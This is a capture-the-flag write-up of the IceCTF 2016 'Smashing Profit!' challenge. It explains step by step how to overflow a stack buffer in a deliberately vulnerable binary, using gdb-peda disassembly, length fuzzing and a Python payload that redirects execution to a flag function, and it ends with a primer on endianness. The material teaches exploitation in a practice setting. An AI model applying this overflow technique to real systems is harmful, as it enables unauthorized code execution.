# IceCTF 2016
## Solution By: Nullp0inter

# Smashing Profit! Pwn 60pts

Do you think you can make this program jump to somewhere it isn't supposed to? Where we're going we don't need buffers!
/home/profit/ on the shell.

# Solution:
So this is one of a few challenges that used an ssh connection to a shell they provided. Unfortunately you can no longer
get login information if you did not save your own (I had to get the info to do the writeup from a friend). They do not
provide a download so you simply have to login via ssh as they tell you. Once you are in your shell instance, go ahead and
`cd /home/profit` like the challenge tells you and you will see a few files like so:

```zsh
[ctf-xxxx@icectf-shell-2016 ~]$   
[ctf-xxxx@icectf-shell-2016 ~]$ cd /home/profit
[ctf-xxxx@icectf-shell-2016 /home/profit]$ ls -l
total 16
-r--r----- 1 root profit   30 Aug 12 08:54 flag.txt
-rw-r--r-- 1 root root    101 Aug 12 08:54 Makefile
-rwxr-sr-x 1 root profit 5708 Aug 12 08:54 profit

```

So what should jump out right away are `flag.txt` and `Makefile`. Obviously flag.txt is both read and write protected, so we
can't really do anything to it since we aren't root or user `profit`. So lets put `flag.txt` aside and look at the make file:

```zsh
[ctf-xxxx@icectf-shell-2016 /home/profit]$ cat Makefile 
CC=gcc
CFLAGS=-m32 -fno-stack-protector

all:
	$(CC) $(CFLAGS) source.c -o profit

clean:
	rm profit
```

Nice compiled 32-bit with no stack protection enabled (i.e. no canary). This is good, because it means we can easily do buffer overflow
exploits. Now if you have ever heard or/read aleph1's "Smashing the Stack for Fun and Profit" from a 1996 release of Phrack Magazine,
you are probably already well aware the exploit we are about to do is a buffer overflow. 

In any case, we now know what the exploit type is but now we need to figure out two things: how big our buffer is, and also where we need
to jump to. We can easily find out how big our buffer is using `python` and `gdb` but finding where we need to jump is probably easier or
more apparent if we use `objdump`. Let's first figure out where we want to jump:

```zsh
[ctf-xxxx@icectf-shell-2016 /home/profit]$ objdump -D profit | grep flag    
0804850b <flag>:
[ctf-xxxx@icectf-shell-2016 /home/profit]$ 
```

So there is a function called "flag" at 0x0804850b, there is a pretty decent chance it is what we need to jump to but we can confirm this
in `gdb` so lets fire that up:

```zsh
[ctf-xxxx@icectf-shell-2016 /home/profit]$ gdb -q profit 
Reading symbols from profit...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x804859b
gdb-peda$ r
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0xf76f2000 --> 0x1a8da8 
ECX: 0xffef4280 --> 0x1 
EDX: 0xffef42a4 --> 0xf76f2000 --> 0x1a8da8 
ESI: 0x0 
EDI: 0x0 
EBP: 0xffef4268 --> 0x0 
ESP: 0xffef4264 --> 0xffef4280 --> 0x1 
EIP: 0x804859b (<main+14>:	sub    esp,0x4)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048597 <main+10>:	push   ebp
   0x8048598 <main+11>:	mov    ebp,esp
   0x804859a <main+13>:	push   ecx
=> 0x804859b <main+14>:	sub    esp,0x4
   0x804859e <main+17>:	call   0x804855e <start>
   0x80485a3 <main+22>:	mov    eax,0x0
   0x80485a8 <main+27>:	add    esp,0x4
   0x80485ab <main+30>:	pop    ecx
[------------------------------------stack-------------------------------------]
0000| 0xffef4264 --> 0xffef4280 --> 0x1 
0004| 0xffef4268 --> 0x0 
0008| 0xffef426c --> 0xf7562a63 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
0012| 0xffef4270 --> 0x80485c0 (<__libc_csu_init>:	push   ebp)
0016| 0xffef4274 --> 0x0 
0020| 0xffef4278 --> 0x0 
0024| 0xffef427c --> 0xf7562a63 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
0028| 0xffef4280 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804859b in main ()
gdb-peda$ 
```

Oh snap! They got peda installed! If you don't know what peda is don't worry about it for now, but I'd definitely [look into it](https://github.com/longld/peda "Peda Is a Fantastic Addition to gdb")
In the meantime, we set a breakpoint at main (`b main`) so we can start to run the program until that point (`r`). The program prints out the
registers, a bit of the code, and the stack (these are all due to peda) but we are interested in seeing what happens in that `flag` function. So
lets have gdb disassemble it using `disass flag` (*NOTE:* peda users can do `pdisass` to get some highlighting over different parts such as
function calls that may prove useful). The output of gdb's disassembly of the function `flag` is:

```gdb
db-peda$ disass flag
Dump of assembler code for function flag:
   0x0804850b <+0>:	push   ebp
   0x0804850c <+1>:	mov    ebp,esp
   0x0804850e <+3>:	sub    esp,0x58
   0x08048511 <+6>:	sub    esp,0x8
   0x08048514 <+9>:	push   0x0
   0x08048516 <+11>:	push   0x8048650
   0x0804851b <+16>:	call   0x80483e0 <open@plt>
   0x08048520 <+21>:	add    esp,0x10
   0x08048523 <+24>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048526 <+27>:	sub    esp,0x4
   0x08048529 <+30>:	push   0x40
   0x0804852b <+32>:	lea    eax,[ebp-0x4c]
   0x0804852e <+35>:	push   eax
   0x0804852f <+36>:	push   DWORD PTR [ebp-0xc]
   0x08048532 <+39>:	call   0x8048390 <read@plt>
   0x08048537 <+44>:	add    esp,0x10
   0x0804853a <+47>:	sub    esp,0x8
   0x0804853d <+50>:	lea    eax,[ebp-0x4c]
   0x08048540 <+53>:	push   eax
   0x08048541 <+54>:	push   0x804865b
   0x08048546 <+59>:	call   0x80483a0 <printf@plt>
   0x0804854b <+64>:	add    esp,0x10
   0x0804854e <+67>:	sub    esp,0xc
   0x08048551 <+70>:	push   DWORD PTR [ebp-0xc]
   0x08048554 <+73>:	call   0x8048400 <close@plt>
   0x08048559 <+78>:	add    esp,0x10
   0x0804855c <+81>:	leave  
   0x0804855d <+82>:	ret    
End of assembler dump.
gdb-peda$ x/s 0x08048650
0x8048650:	"./flag.txt"
gdb-peda$ 
```

If you read carefully you'll see I also ran `x/s 0x08048650`, I did this because there is a call to `open` which needs a filepath to work
(see `man 2 open` from a shell) and that as a parameter it would be pushed almost immediately prior to the function call. The command `x/s`
is used to e**x**amine, as a **s**tring, the memory at location `0x08048650` which is what is pushed just before the call to `open`. So based
on knowing that this function opens `flag.txt` and also has calls to `read` and `printf` we can be confidently sure that it is where we need
to jump to.

That leads us back to the other thing we need to know, the size of our buffer. For this I am going to exit `gdb` for a moment and use `python`. 

```zsh
gdb-peda$ q
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 64" | ./profit
Smashing the stack for fun and...?
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 128" | ./profit
Smashing the stack for fun and...?
[1]    12416 done                python -c "print 'A' * 128" | 
       12417 segmentation fault  ./profit
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 128" | ./profit
Smashing the stack for fun and...?
[1]    12416 done                python -c "print 'A' * 128" | 
       12417 segmentation fault  ./profit
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 120" | ./profit
Smashing the stack for fun and...?
[1]    12570 done                python -c "print 'A' * 120" | 
       12571 segmentation fault  ./profit
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 90" | ./profit
Smashing the stack for fun and...?
[1]    12687 done                python -c "print 'A' * 90" | 
       12688 segmentation fault  ./profit
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 70" | ./profit
Smashing the stack for fun and...?
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 80" | ./profit
Smashing the stack for fun and...?
[1]    12954 done                python -c "print 'A' * 80" | 
       12955 segmentation fault  ./profit
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 75" | ./profit
Smashing the stack for fun and...?
[1]    13079 done                python -c "print 'A' * 75" | 
       13080 segmentation fault  ./profit
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A' * 74" | ./profit
Smashing the stack for fun and...?
[ctf-xxxx@icectf-shell-2016 /home/profit]$ 

```

So what I did there was I used python to print out 64 A's in an attempt to figure out the buffer size. What I am looking for are `segmentation
faults`, as seen after I tried 128 A's. I then proceeded to alter that number in a sort of binary-search like manner until I determined that
the program will `segfault` at 75 A's but *not* at 74. This is good. We can be fairly certain that at 75 A's printed, we start to overwrite
*something* important in the program. Our goal, however, is to overwrite the programs `eip` or "Instruction Pointer" which in basic terms
simply points to the next location to exectute code once you hit a return (for our purposes here this definition is *"good enough"*). 
Something to note is that we generally work in multiples of 4 bytes though so we want to go up to 76 bytes (*Note* I kind of glossed over this
but each ascii character is a single byte in memory though that may vary between architectures).
You can take my word for this OR you use gdb and just keep copying and pasting patters until you recognize where you overwrite the 4 bytes of
`eip`.  Once you recognize the pattern you start to consistently overwrite `eip` at you know your *distance to eip* which is the number of
bytes you have to write beforehand. In this case as I said it is 76 bytes so 76 of *any* ascii character will work. Let's just keep using A's,
so we need 76 A's then the address of `flag`. At this point you need to know just a little bit about something called endianness 
(*NOTE* see "On Endianness" below) and that the address goes in little endian. So we can now craft our little exploit string using the format
of `<76 characters><little endian address of flag()>`. Remember from our earlier disassembly of flag that it starts at address 0x0804850b so
if we put everything together in a python string and pipe it to the program we get the following:

```zsh
[ctf-xxxx@icectf-shell-2016 /home/profit]$ python -c "print 'A'*76+'\x0b\x85\x04\x08'" | ./profit 
Smashing the stack for fun and...?
IceCTF{who_would_have_thunk?}
[1]    31285 done                python -c "print 'A'*76+'\x0b\x85\x04\x08'" | 
       31286 segmentation fault  ./profit
[ctf-xxxx@icectf-shell-2016 /home/profit]$ 
```

There it is! The flag is `IceCTF{who_would_have_thunk?}`.

# On Endianness:
While this is pretty obvious to many people in the CTF, I wanted to write a quick blurb about how endianness works for any new folks that
decide to read this. On x86 architectures the CPU reads bytes in what is called *little endian*. *Endianness* refers to the order in which
the specific architecture is reading the bytes and should be either *big endian*, *little endian*, or *bi-endian*. 

### Big Endian:
In *big endian* the bytes are read in the order you might read them. For example lets take the 4-byte address `0xaabbccdd`. Naturally you as
a human will read that from left to right, what you might consider *in order* as `aa` then `bb` then `cc` then `dd`. This is how a big endian
architecture will read them as well. So in a python injection that would look like `python -c "print '\xaa\xbb\xcc\xdd'" | ./<victim program>`

### Little Endian:
In little endian they are read in *reverse order*. This doesn't mean that in `0xabcdef12` you end up with `0xbadcfe21` but rather that you go
from right to left, keeping the bytes in order. Remember that in hex each **_two_** digits represents a single byte, so `aa` is a byte, `bb` 
is another byte, and so on. So going back to using `0xaabbccdd` as our example address in little endian you read it byte by byte from *right
to left*. That means in a python injection it would look like `python -c "print '\xdd\xcc\xbb\xaa'" | ./<victim program>`

### Bi Endian:
The architecture can support little endian *and* big endian so you'll have to do a little bit of testing to figure it out for yourself. I'm
not totally sure how it is decided here and haven't had to deal with it yet.
